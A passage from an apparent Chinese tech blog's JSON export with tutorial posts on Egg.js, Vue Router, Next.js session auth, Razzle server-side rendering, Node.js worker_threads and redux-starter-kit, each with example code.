'koa-logger';export default () =&gt; logger(); 在 config 里配置中间件。 1234// config/config.default.tsconfig.middleware = [ 'logger',]; 因为 Egg 是根据文件名来索引的，因此 logger 的名字要对应。 路由（路由）Router 主要用来描述请求 URL 和具体承担执行动作的 Controller 的对应关系。通常来说用户访问的 url 地址就对应的路由的内容。在 RESTFUL API 里路由就是 api 的入口。 定义路由需要通过上下文 app.router 来定义。 1234567// app/router.jsmodule.exports = app =&gt; &#123; const &#123; router, controller &#125; = app; router.get('/home', controller.home); router.get('/user/:id', controller.user.page); router.post('/admin', isAdmin, controller.admin);&#125;; 控制器（Controller）Controller 负责解析用户的输入，处理后返回相应的结果。通常在 Controller 会做以下的事情： 获取用户通过 HTTP 传递过来的请求参数。 校验、组装参数。 调用 Service 进行业务处理，必要时处理转换 Service 的返回结果，让它适应用户的需求。 通过 HTTP 将结果响应给用户。 在 Egg 里使用 Controller 需要在 controller 目录里创建文件，返回的类需要继承 Controller 类，并且 Controller 的访问需要按照文件的目录结构和名称。 1234567891011121314151617181920212223// app/controller/post.jsconst Controller = require('egg').Controller;class PostController extends Controller &#123; async create() &#123; const &#123; ctx, service &#125; = this; const createRule = &#123; title: &#123; type: 'string' &#125;, content: &#123; type: 'string' &#125;, &#125;; // 校验参数 ctx.validate(createRule); // 组装参数 const author = ctx.session.userId; const req = Object.assign(ctx.request.body, &#123; author &#125;); // 调用 Service 进行业务处理 const res = await service.post.create(req); // 设置响应内容和响应状态码 ctx.body = &#123; id: res.id &#125;; ctx.status = 201; &#125;&#125;module.exports = PostController; 如果返回不是类，也可以使用函数的方式： 123456789// app/controller/search.jsexports.index = async ctx =&gt; &#123; ctx.body = `search: $&#123;ctx.query.name&#125;`;&#125;;// app/router.jsmodule.exports = app =&gt; &#123; app.router.get('/search', app.controller.search.index);&#125;; 服务（Service）通过为了做到数据分离，会把对数据库的操作以及一些复杂的数据计算，甚至是第三方的数据获取都放在 service 函数里面。 定义 service 需要在 service 目录下创建文件，Egg 会自动关联相关文件。 123456789101112// app/service/user.jsconst Service = require('egg').Service;class UserService extends Service &#123; async find(uid) &#123; const &#123; ctx &#125; = this; const user = await ctx.db.findAll(); return user; &#125;&#125;module.exports = UserService; 在使用 Service 的时候需要根据文件的目录结构以及名称，包括函数名来使用。 123app/service/biz/user.js =&gt; ctx.service.biz.userapp/service/sync_user.js =&gt; ctx.service.syncUserapp/service/HackerNews.js =&gt; ctx.service.hackerNews 使用插件Egg 的插件比较多，这里介绍如何使用 mongoose 的插件。在 Egg 里可以使用 egg-mongoose，也可以自建 mongoose 的启动。 如果是自建立 mongoose 启动，那么就是在入口文件里先连接好数据库。在 app/index.ts 里，添加代码，连接数据库并把模型挂载在 app 对象上。 123456789101112131415161718import mongoose from 'mongoose';function connectDB() &#123; mongoose.Promise = Promise; return mongoose.connect('mongodb://127.0.0.1:27017/test', &#123; useMongoClient: true, &#125;);&#125;// 启动入口export default async (app) =&gt; &#123; // 连接数据库 await connectDB(); // 挂载模型 app.model = &#123; User: require('./model/user').default, &#125;;&#125; 也可以使用 egg-mongoose 这个插件。首先是配置插件信息，其次是配置连接信息，最后创建 model 目录，定义模型即可，在 ctx.model 里就是模型对象。 1234567// config/plugin.tsconst plugin: EggPlugin = &#123; mongoose: &#123; enable: true, package: 'egg-mongoose', &#125;&#125; 12345// config/config.default.tsconfig.mongoose = &#123; url: 'mongodb://localhost:27017/zaifuli', options: &#123;&#125;,&#125; 12345678910// app/model/user.tsexport default function (app) &#123; const mongoose = app.mongoose; const UserSchema = new mongoose.Schema(&#123; name: string, &#125;); return mongoose.model('User', UserSchema);&#125; 1234567// app/service/Test.tsclass Text extend Service &#123; public async sayHi(count: number) &#123; const res = this.ctx.model.User.find(&#123;&#125;).limit(count); return res; &#125;&#125; 相关设计 登录注册：使用 token 方式，自己简单实现，也可以使用 json-web-token。 登录验证：使用中间件进行拦截实现。 权限验证：使用中间件进行拦截实现。 权限设计：打一个映射表，与用户角色产生映射。 响应体统一结构化：使用 extend/context.ts 实现。 工具函数：可以创建一个 utils 目录，在 utils 里提供工具函数，也可以在 app/extend/helper.ts 里实现，注意 helper 里不能有上下文。 分页结构：同响应体统一结构化，分页一般在 service 里进行。 数据验证：因为每个接口的输入格式都可能不同，因此在 controller 里做，也可以抽象比较通用的格式。 路由设计：路由统一写在 app/router 里，不要再分目录结构了，一个文件对应着一个类别的路由。例如 login.ts 里就放置登录注册注销等路由。基本的都是每一个路由映射着一个控制器方法。 数据访问：数据层统一写在 service，在 service 里主要是与数据库交互。controller 里可以会调用很多个 service 的接口。 数据模型：数据模型的定义在 app/modals 目录里定义，按照不同的表结构进行不同维度的区分。 数据库 ORM：因为数据库是 mysql，因此使用 sequelize，一个 基于 promise 的 Node.js ORM，它具有强大的事务支持，关联关系，预读和延迟加载，读取复制等功能。如果使用 mongodb 则使用 mongoose。 单元测试：使用 jest 进行测试，测试 controller 的方法即可。 注释与类型：一些函数/方法请写好 jsdoc 注释，写好 ts 的类型。 注意事项 在 context.ts 里的方法第一个参数必须是 this: Context，调用时必须使用 this.ctx.xxx，不能解构哦。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Vue Router 使用指南","slug":"Vue/Vue Router 使用指南","date":"2019-02-25T03:54:31.000Z","updated":"2021-06-15T06:10:52.899Z","comments":true,"path":"/stories/2019/02/Vue/Vue Router 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/Vue/Vue Router 使用指南/","excerpt":"前言Vue Router 是 Vue 官方推出的前端路由框架，主要用于单页面应用的前端路由。包含的功能有： 嵌套的路由/视图表。 模块化的、基于组件的路由配置。 路由参数、查询、通配符。 基于 Vue.js 过渡系统的视图过渡效果。 细粒度的导航控制。 带有自动激活的 CSS class 的链接。 HTML5 历史模式或 hash 模式，在 IE9 中自动降级。 自定义的滚动条行为。","text":"前言Vue Router 是 Vue 官方推出的前端路由框架，主要用于单页面应用的前端路由。包含的功能有： 嵌套的路由/视图表。 模块化的、基于组件的路由配置。 路由参数、查询、通配符。 基于 Vue.js 过渡系统的视图过渡效果。 细粒度的导航控制。 带有自动激活的 CSS class 的链接。 HTML5 历史模式或 hash 模式，在 IE9 中自动降级。 自定义的滚动条行为。 使用先安装： 1npm install vue-router 接下来创建一个 router 目录，分别再创建 index.js（创建路由） 和 routes.js（路由表） 的文件。 12345678910111213141516171819// index.jsimport Router from 'vue-router';import routes from './scenes';export default () =&gt; new Router(&#123; routes: routes&#125;);// routes.jsimport App from '../App';import Foo from '../views/Foo';import NotFound from '../views/NotFound';export default [ &#123; path: '/', component: App &#125;, &#123; path: '/foo', component: Foo &#125;, &#123; path: '/bar', component: () =&gt; import('../views/Bar.vue') &#125;, &#123; path: '*', component: NotFound &#125;,]; 这里的 * 指的是末位配置，如果匹配不到就是 404 页。Vue 自带按需加载的功能，因此可以直接使用 () =&gt; import，而 React 需要自行配置 react-loader。 接着在 main.js 里配置路由。 12345678import createRouter from './router';import router from 'vue-router';Vue.use(router);new Vue(&#123; router: createRouter(), render: h =&gt; h(App),&#125;).$mount('#app'); 写完后，启动，你会发现没有任何效果，是的还需要一些 “占位符”，在 App.vue 里。 1234567891011&lt;p&gt; &lt;!-- 使用 router-link 组件来导航. --&gt; &lt;!-- 通过传入 `to` 属性指定链接. --&gt; &lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt; &lt;router-link to=\"/foo\"&gt;Foo&lt;/router-link&gt; &lt;br /&gt; &lt;router-link to=\"/bar\"&gt;Bar&lt;/router-link&gt;&lt;/p&gt;&lt;!-- 路由出口 --&gt;&lt;!-- 路由匹配到的组件将渲染在这里 --&gt;&lt;router-view&gt;&lt;/router-view&gt; 路由参数类似 /user/:id 的路由参数，在 this.$router.params 里可以获取。类似 /user/?id=xx 的查询参数，在 this.$router.query 里可以获取。 12345routes: [ &#123; path: '/user/:id', component: User &#125;];// ...&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/div&gt; 几种方式进行导航。 1234&lt;router-link to=\"/user/123\"&gt;User&lt;/router-link&gt;&lt;router-link :to=\"&#123; name: 'user', params: &#123; userId: 123 &#125;&#125;\"&gt;User&lt;/router-link&gt;router.push(&#123; name: 'user', params: &#123; userId: 123 &#125;&#125;);router.push('/user/123'); 有一个 props 属性，可以直接传进去组件的 props 里。 12345&#123; path: '/search', component: SearchUser, props: (route) =&gt; (&#123; id: route.query.id &#125;)&#125; 相当于在组件的 props 里获取到。 123456789101112&lt;template&gt; &lt;div class=\"link1\"&gt; &lt;div&gt;&#123;&#123; id &#125;&#125;&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; props: &#123; id: String, &#125;&#125;&lt;/script&gt; 路由重定向当访问某个路径时进行重定向，使用 redirect 属性。 1234567&#123; path: '/user', name: 'User', redirect: &#123; name: 'Home' &#125;&#125; 没多大意义，一般都是逻辑重定向，例如判断 token 决定是否需要重定向。唯一的好处就是用于多路径页面上。 路由守卫路由守卫其实是对于一个要登录的页面就行守卫，一般的逻辑是需要检查 token 的有效性，检查通过后进行转跳。 1234567// 全局的 routerrouter.beforeEach((to, from, next) =&gt; &#123; authCheck().then(result =&gt; &#123; if (result) return next(); else router.push('/login'); &#125;);&#125;); 在组件的实例里可以用 this.$router，例如 this.$router.push(&#39;/user-admin&#39;)。 具体看 编程式的导航。 嵌套路由嵌套路由主要使用到 &lt;route-view&gt; 决定的是 route-view 的位置放置，可以实现多级的嵌套路由，但是不建议超过三级。 先改路由表，将 bar 放到 foo 下。 12345678910111213export default [ &#123; path: '/', component: App &#125;, &#123; path: '/foo', name: 'foo', component: Foo, children: [ &#123; path: '/bar', name: 'bar', component: () =&gt; import('../views/Bar.vue'), &#125;, ], &#125;, &#123; path: '*', component: NotFound &#125;,]; 接着需要在 foo 上放置一个 &lt;router-view&gt;。 123456&lt;template&gt; &lt;div&gt; &lt;h3&gt;Foo&lt;/h3&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt; 当访问 /foo 时显示 Foo，当访问 /foo/bar 时显示 Foo Bar。 比较常见用到的场景是导航栏和菜单栏。 参考资料 https://router.vuejs.org/zh/guide/","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"如何在 Next.js 里优雅做用户认证控制？","slug":"同构/Next/如何在 Next.js 里优雅做用户认证控制？","date":"2019-02-24T02:05:53.000Z","updated":"2021-06-15T06:10:52.909Z","comments":true,"path":"/stories/2019/02/同构/Next/如何在 Next.js 里优雅做用户认证控制？/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/同构/Next/如何在 Next.js 里优雅做用户认证控制？/","excerpt":"前言Next.js 是一个 React 的同构框架。因为使用 Next 开发的应用是服务端渲染应用，对 SSR 很了解都知道，在首屏渲染时，所有的渲染数据由服务端直接渲染获取，而之后就是前端接管路由，后面的数据通过 JSON API 获取。就因为这样导致了，在 Next.js 上做用户认证控制比较麻烦。 下面就来看看，在 Next.js 里是如何做用户认证控制的。在之前，可以阅读 Next.js：React 服务端渲染框架，了解相关知识。","text":"前言Next.js 是一个 React 的同构框架。因为使用 Next 开发的应用是服务端渲染应用，对 SSR 很了解都知道，在首屏渲染时，所有的渲染数据由服务端直接渲染获取，而之后就是前端接管路由，后面的数据通过 JSON API 获取。就因为这样导致了，在 Next.js 上做用户认证控制比较麻烦。 下面就来看看，在 Next.js 里是如何做用户认证控制的。在之前，可以阅读 Next.js：React 服务端渲染框架，了解相关知识。 用户认证传统的用户认证通过后端路由来控制。当用户未登录时，访问需要权限的页面，后端路由就会进行一系列的转跳。 在单页面（SPA）应用里，所有的路由都是由前端控制，也就是说后端只负责返回确定的检验 JSON 数据。通常在登录的时候，会请求一个 api/login，如果通过了就会拿到 user 信息以及 cookie/token，接着前端控制前端路由，进行各种的路由转跳。 而到了服务端渲染（SSR）应用里，用户认证就是上面两种的结合体，在首屏渲染时由后端控制，在前端接管路由后由前端控制。这样比较麻烦，需要做两端的控制。总之，就是要未登录的用户，看不到已经登录后才能看到的页面。 情景假设假设有以下情景，有几个页面，有些页面不需要登录即可访问，有些页面需要登录才可以访问。为了方便，列出简单的 pages 目录结构。 12345- pages - index.js - login.js - user.js - detail.js 这里一共有 4 个页面，index 和 login 页都不用进行登录，而想要访问 user 和 detail 页，则需要访问。如果未登录访问需要认证的页面，则需要自动转跳到 login 页。 大致实现的思路如下： 当用户打开 user 时，后端会对 session 于 cookie 进行验证。如果通过则，设置一个状态值 isLogin 标志。这一步处理非常简单，在 Koa 里可以使用 koa-session 中间件处理，并且认证部分 koa-session 已经帮我们做了，只需要在登录的时候设置好 isLogin 即可。 123456789101112131415router .get('/api/auth', async ctx =&gt; &#123; const isLogin = ctx.session.isLogin || false; ctx.body = &#123; status: 200, data: isLogin &#125;; &#125;) .get('/api/login', async ctx =&gt; &#123; ctx.session.user = &#123;&#125;; ctx.session.isLogin = true; ctx.body = &#123; status: 200, data: true &#125;; &#125;) .get('/api/logout', async ctx =&gt; &#123; ctx.session = null; ctx.body = &#123; status: 200, data: true &#125;; &#125;); 在页面组件里利用 getInitialProps 在最前面调用 /api/auth 接口进行检查。在 componentDidMount 里确定 isLogin 的值，如果不为 true，则转跳。具体看下面的认证 HOC 实现。 认证 HOC12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import React, &#123; Component &#125; from 'react';import axios from 'axios';import Router from 'next/router';axios.defaults.baseURL = 'http://127.0.0.1:3000';async function hasAuth(&#123; req &#125;) &#123; try &#123; const headers = &#123;&#125;; if (req) headers.cookie = req.headers.cookie; const res = (await axios(&#123; url: '/api/auth', headers &#125;)).data; return res.data || false; &#125; catch (e) &#123; console.log('Auth error: ' + e.message); return false; &#125;&#125;// 检查当前页面是否通过认证，如果没通过则重定向到登录页。export default (View) =&gt; class extends Component &#123; static async getInitialProps(arg) &#123; let state = &#123; isLogin: true &#125;; const isLogin = await hasAuth(arg); if (!isLogin) state.isLogin = false; if (typeof View.getInitialProps === 'function') &#123; const res = await View.getInitialProps(arg); state = &#123; ...state, ...res &#125;; &#125; return state; &#125; componentDidMount() &#123; if (!this.props.isLogin) &#123; Router.replace('/login'); &#125; &#125; render() &#123; if (this.props.isLogin) &#123; return &lt;View &#123;...this.props&#125; /&gt;; &#125; // 认证期间显示的内容 return ( &lt;div&gt;加载中 ...&lt;/div&gt; ); &#125;&#125;; 写好 hoc 之后，对某些页面进行认证权限限制时，直接应用在页面组件上即可。 123456789101112import React from 'react';import Link from 'next/link';import withAuth from '../containers/hoc/auth';export default withAuth(() =&gt; ( &lt;div&gt; &lt;h3&gt;详细页&lt;/h3&gt; &lt;p&gt; &lt;Link href='/'&gt;&lt;a&gt;首页&lt;/a&gt;&lt;/Link&gt; &lt;/p&gt; &lt;/div&gt;)); 示例 Demo你可以查看笔者写的 Demo：next-auth-demo。 在 Next.js 仓库里也有一个 auth 的示例：with-cookie-auth。 参考资料 http://nextjs.frontendx.cn/docs/#路由","categories":[{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/categories/同构/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"},{"name":"Next","slug":"Next","permalink":"http://me.lizhooh.com/tags/Next/"},{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/tags/同构/"}]},{"title":"基于 Razzle 的 React 服务端渲染集成","slug":"React/Universal 同构/基于 Razzle 的 React 服务端渲染集成","date":"2019-02-23T04:39:16.000Z","updated":"2021-06-15T06:10:52.887Z","comments":true,"path":"/stories/2019/02/React/Universal 同构/基于 Razzle 的 React 服务端渲染集成/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/React/Universal 同构/基于 Razzle 的 React 服务端渲染集成/","excerpt":"前言Razzle 是一个开箱即用的服务端渲染解决方案，它将 SSR 所需的复杂配置抽象为单一的依赖关系，为你提供了类似于 create-react-app 的搭手架环境。Razzle 支持多种框架，不仅仅是 React，对于 Vue，Angluar 同样适用。 本文介绍如何基于 Razzle 打造自己的服务端渲染框架，同时介绍了如何集成 Redux，React-Router，Styled-Components 等。 Razzle 的介绍：react-server-render-in-action - razzle","text":"前言Razzle 是一个开箱即用的服务端渲染解决方案，它将 SSR 所需的复杂配置抽象为单一的依赖关系，为你提供了类似于 create-react-app 的搭手架环境。Razzle 支持多种框架，不仅仅是 React，对于 Vue，Angluar 同样适用。 本文介绍如何基于 Razzle 打造自己的服务端渲染框架，同时介绍了如何集成 Redux，React-Router，Styled-Components 等。 Razzle 的介绍：react-server-render-in-action - razzle 创建项目安装 razzle 搭手架工具，用 cli 创建项目。 12345npm install -g create-razzle-appcreate-razzle-app myappcd my-appnpm start 创建之后代码目录类似 create-react-app。在创建之后会在 src 看到几个文件：server.js、app.js、client.js、index.js 等它们的关系如下。 当启动服务的时候，后端的入口文件是 index.js，前端的入口文件是 client.js。在服务端渲染的时候，需要引入 app.js 文件，因此在 app.js 里只能适当的使用通用 API。从代码来看，Razzle 并没有做太多的事情，而是版我们把 Webpack 配好，剩下的提供一个很高的灵活度让你去配置属于你的服务端渲染框架。 使用 Koa在创建项目后，默认是使用 Express 作为后端框架，因为 Express 对异步路由不太友好，因此这里改为使用 Koa。 先安装相关依赖库。 12npm install --save koa koa-router koa-staticnpm install --save isomorphic-fetch serialize-javascript is-env es6-promise 使用 koa 之后需要修改 server.js 文件。在 server.js 里只是把 Express 的代码转换成 Koa 的代码，熟悉 Koa 的大家都知道是怎么回事了，这里列出大致的结构。 12345678910111213const server = new Koa();const router = new Router();router.get('/*', async ctx =&gt; &#123; // ...&#125;);server .use(serve(process.env.RAZZLE_PUBLIC_DIR)) // &lt;-- 静态资源目录 .use(router.routes()) .use(router.allowedMethods());export default server.callback(); 唯一注意的是需要把 export default 修改成 callback 的模式。 使用 Redux先安装相关依赖库。 1npm install --save redux react-redux redux-starter-kit Redux 服务端渲染，只需要关注的两个方面： 1 store 在两端创建的问题 2 store 的初始值来源问题。 为了方面 store 的初始值获取，在客户端里要求使用路由表配置页面的路，并且在页面（page）组件上使用一个静态方法 getInitProps 获取当前页面的初始数据，在获取完成后同步到 store 里。 这是配置页面的路由表非常简单。 1234567891011export default [ &#123; path: '/', exact: true, component: Index, &#125;, &#123; path: '/about', component: About, &#125;,]; 在页面组件里需要在 getInitProps 里返回初始化的数据。 123456789101112131415161718192021222324252627282930313233343536export default connect( state =&gt; (&#123; state: state.index &#125;), actions,)(class Index extends Component &#123; static async getInitProps(&#123; match, history, location &#125;, &#123; req, res &#125;) &#123; const data = await fetch('http://127.0.0.1:3000/api/index') .then(res =&gt; res.json()); return &#123; index: &#123; // 当前页面的 reducer 名称 list: data, count: 1, &#125;, &#125;; &#125; componentDidMount() &#123; // 这里是客户端的初始化 const &#123; update &#125; = this.props; if (isNotServerRenderPage()) &#123; Index.getInitProps(&#123;&#125;).then(res =&gt; update(res.index)); &#125; &#125; render() &#123; return ( &lt;Root&gt; &lt;h3&gt;hello world!&lt;/h3&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to='/'&gt;Index&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to='/about'&gt;About&lt;/Link&gt;&lt;/li&gt; &#123;this.props.state.list.map((item, index) =&gt; ( &lt;li key=&#123;item.id&#125;&gt;&#123;item.title&#125;&lt;/li&gt; ))&#125; &lt;/ul&gt; &lt;/Root&gt; ); &#125;&#125;); 在客户端里（client.js）初始化 store，store 的初始值来自于 window.__INIT_STATE__ 变量。 12345678910import createStore from './stores';hydrate( &lt;Provider store=&#123;createStore(window.__INIT_STATE__)&#125;&gt; &lt;BrowserRouter&gt; &lt;App /&gt; &lt;/BrowserRouter&gt; &lt;/Provider&gt;, document.getElementById('root'),); createStore 是一个通用的创建 store 的函数。 123456const createStore = state =&gt; configureStore(&#123; devTools: true, reducer: reducers, middleware: [thunk, logger], preloadedState: state,&#125;); 在服务端里（server.js）初始化 store，store 的初始值来自于页面当前路由的组件的 getInitProps 函数。 12345678910111213141516171819router.get('/*', async ctx =&gt; &#123; const url = ctx.req.url; const view = routes.find(i =&gt; i.path === url); let state = &#123;&#125;; if (view &amp;&amp; typeof view.component.getInitProps === 'function') &#123; state = await view.component.getInitProps(&#123;&#125;, &#123; req: ctx.req, res: ctx.res &#125;); &#125; const store = createStore(&#123;&#125;).getState(); state = &#123; ...store, ...state &#125;; const markup = renderToString( &lt;Provider store=&#123;createStore(state)&#125;&gt; &lt;StaticRouter context=&#123;context&#125; location=&#123;url&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt; &lt;/Provider&gt; );&#125;); 使用 Styled-Components先安装相关依赖库。 1npm install --save styled-components 集成 styled-components 只需要创建一个 sheet，把 sheet.collectStyles 包裹你的组件，在 html 里插入初始化的 css 代码即可。 123456789101112131415161718const sheet = new ServerStyleSheet();const markup = renderToString(sheet.collectStyles( &lt;Provider store=&#123;createStore(state)&#125;&gt; &lt;StaticRouter context=&#123;context&#125; location=&#123;url&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt; &lt;/Provider&gt;));ctx.body = render(&#123; css: assets.client.css || '', js: assets.client.js, style: sheet.getStyleTags(), // &lt;-- 这里，得到是 &lt;style&gt; ... &lt;/style&gt; markup: markup, state: serialize(state), path: url,&#125;); 示例 Demo你可以看看笔者写的示例 Demo：razzle-myreactapp。 参考资料 https://github.com/jaredpalmer/razzle","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"}]},{"title":"解读 Nodejs 真正的多线程模块","slug":"Nodejs/解读 Nodejs 真正的多线程模块","date":"2019-02-20T06:03:59.000Z","updated":"2021-06-15T06:10:52.846Z","comments":true,"path":"/stories/2019/02/Nodejs/解读 Nodejs 真正的多线程模块/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/Nodejs/解读 Nodejs 真正的多线程模块/","excerpt":"前言伴随 v10.5.0 的发布，Nodejs 新增了对多线程的实验性支持（worker_threads 模块）。意味着 Nodejs 可以更加容易的处理复杂的密集计算任务。 在这之前，如果你想要在 Nodejs 上进行密集的 CPU 计算任务，通常我们会有几种的实现方式，包括了使用 child_process 模块创建多进程的方式，使用 c++ 编写扩展的方式，使用 golang 等其他语言编写插件方式，现在多了一种选择就是使用 worker_threads 模块，利用工作线程来执行。","text":"前言伴随 v10.5.0 的发布，Nodejs 新增了对多线程的实验性支持（worker_threads 模块）。意味着 Nodejs 可以更加容易的处理复杂的密集计算任务。 在这之前，如果你想要在 Nodejs 上进行密集的 CPU 计算任务，通常我们会有几种的实现方式，包括了使用 child_process 模块创建多进程的方式，使用 c++ 编写扩展的方式，使用 golang 等其他语言编写插件方式，现在多了一种选择就是使用 worker_threads 模块，利用工作线程来执行。 创建多线程创建多线程需要使用到 worker_threads 模块，在 v11.10 版本里此模块已经取消了实验性，可以直接导入。 worker_threads 模块中比较重要的 api： MessageChannel - 用于创建异步、双向通信的通道实例。MessageChannel 实例包含两个属性 port1 和 port2，这两个属性都是 MessagePort 的实例。 MessagePort - 用于表示 MessageChannel 通道的终端，用于 Worker 之间传输结构化数据、内存区域和其他的MessagePort。MessagePort 继承了 EventEmitter，因此可以使用 postMessage 和 on 方法实现消息的传递与接收。 Worker - 用于创建单独的 js 线程。 parentPort - 子线程中的 parentPort 指向可以与主线程进行通信的 MessagePort，可以使用 parentPort 向主线程发送消息。 isMainThread - 用于判断当前运行的程序是否是主线程。 workerData - 用于查看在使用 Worker 创建时传递的数据。 threadId - 用于查看当前线程的 id。 在多线程里会有一个主线程和几个工作线程。通常主线程负责调度，而工作线程负责执行任务。 1234567891011121314151617const &#123; isMainThread, parentPort, workerData, threadId, Worker,&#125; = require('worker_threads');const fibonacci = require('fibonacci');function mainThread() &#123; const worker = new Worker(__filename); console.log('创建线程');&#125;function workerThread() &#123; console.log('退出线程'); process.exit();&#125;isMainThread ? mainThread() : workerThread(); 主线程与工作线程通信主线程与工作线程通信使用 postMessage 和 on，支持结构化数据的传递。 12345678910111213141516function mainThread() &#123; const worker = new Worker(__filename); console.log('创建线程'); // 向工作线程发送消息 worker.postMessage(&#123; taskid: 1 &#125;); // 接受来自工作线程的消息 worker.on('message', msg =&gt; &#123;&#125;);&#125;function workerThread() &#123; // 向主线程发送消息 parentPort.postMessage(&#123; name: 'aab' &#125;); // 接受来自主线程的消息 parentPort.on('message', (msg) =&gt; &#123;&#125;); process.exit();&#125; 除了 value 之外，postMessage 方法还支持传入 transferList 参数，transferList 是一个 List，支持的数据类型包括 ArrayBuffer 和 MessagePort 对象。 线程间共享内存假如创建了两个线程，线程之间如何读取同一个变量，也就是共享内存的问题。 如果 postMessage 中的 value 是 SharedArrayBuffer 的话，则线程之间就可以共享内存。 1234567891011121314151617181920212223242526272829303132const &#123; Worker, isMainThread, parentPort &#125; = require('worker_threads');function mainThread() &#123; const sab = new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT * 5); const arr = new Int32Array(sab); for (let i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; console.log(arr); // Int32Array [ 0, 1, 2, 3, 4 ] // 创建两个线程 const workers = [...new Array(2)].map(i =&gt; &#123; const worker = new Worker(__filename); worker.postMessage(sab); worker.on('message', () =&gt; &#123; console.log(arr); &#125;); return worker; &#125;);&#125;function workerThread() &#123; parentPort.on('message', (msg) =&gt; &#123; const ia = new Int32Array(msg); ia[0] = ia[0] + 1; parentPort.postMessage('done'); &#125;);&#125;isMainThread ? mainThread() : workerThread(); 可以看到，arr 的内容在工作线程里被改变了。 计算任务示例多线程计算。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950const &#123; isMainThread, parentPort, workerData, threadId, Worker,&#125; = require('worker_threads');const fibonacci = require('fibonacci');// 主线程，负责调度function mainThread() &#123; // 创建任务 const tasks = [... new Array(6)].map((v, i) =&gt; (&#123; id: i + 1, params: &#123; n: 1000 * (i + 1) &#125;, result: null, &#125;)); const start = Date.now(); function isEnd(workers = []) &#123; const has = workers.some(i =&gt; !i.exit); if (!has) &#123; console.log('-----------------------------------'); console.log(`总共用时：$&#123;Date.now() - start&#125; ms`); &#125; &#125; // 新建工作线程 const workers = tasks.map((v, i) =&gt; &#123; const worker = new Worker(__filename, &#123; workerData: v.params &#125;); worker.id = i + 1; worker.on('message', data =&gt; &#123; if (data.status === 'completed') &#123; console.log(`工作线程[$&#123;worker.id&#125;]：完成 -&gt; 用时 $&#123;data.result.ms&#125; ms`); tasks[i].result = data.result; &#125; worker.exit = true; isEnd(workers); &#125;); return worker; &#125;);&#125;// 工作线程，负责计算function workerThread() &#123; const &#123; n &#125; = workerData; const result = fibonacci.iterate(n); parentPort.postMessage(&#123; status: 'completed', result &#125;); process.exit();&#125;isMainThread ? mainThread() : workerThread(); 单线程计算： 12345678910111213141516const fibonacci = require('fibonacci');const tasks = [... new Array(6)].map((v, i) =&gt; (&#123; id: i + 1, params: &#123; n: 1000 * (i + 1) &#125;, result: null,&#125;));const start = Date.now();tasks.forEach(i =&gt; &#123; const result = fibonacci.iterate(i.params.n); console.log(`任务[$&#123;i.id&#125;]：完成 -&gt; 用时 $&#123;result.ms&#125; ms`);&#125;);console.log('-----------------------------------');console.log(`总共用时：$&#123;Date.now() - start&#125; ms`); 在上面的示例里，一个有 6 个计算任务。在多线程计算里创建了 6 个线程来计算这些任务。可以看出使用多线程计算后，总的计算时间比单线程计算减少了接近 50%。 一些应用场景列出几个可能会火的应用场景。 服务端渲染能力增强。 密集 CPU 计算能力增强。 多线程的爬虫。 参考资料 https://medium.com/dailyjs/threads-in-node-10-5-0-a-practical-intro-3b85a0a3c953 https://nodejs.org/dist/latest-v11.x/docs/api/worker_threads.html","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"redux-starter-kit 使用指南","slug":"Redux/redux-starter-kit 使用指南","date":"2019-02-17T02:02:09.000Z","updated":"2021-06-15T06:10:52.892Z","comments":true,"path":"/stories/2019/02/Redux/redux-starter-kit 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/Redux/redux-starter-kit 使用指南/","excerpt":"前言众所周知，Redux 的核心从一开始就很小，最初的意图始终是保持核心小，使 API 可扩展，发展生态系统。这使得使用 Redux 需要编写很多基础性的代码，带来了许多无必要的重复劳动。 redux-starter-kit 是 Redux 官方推出的一个工具库，它旨在简化 Redux 的编写代码，在 Redux 核心周围添加了一些实用工具，例如简化的存储设置，最常用的选项和一些健全性检查，带有查找表定义的简化 reducer 和 Immer 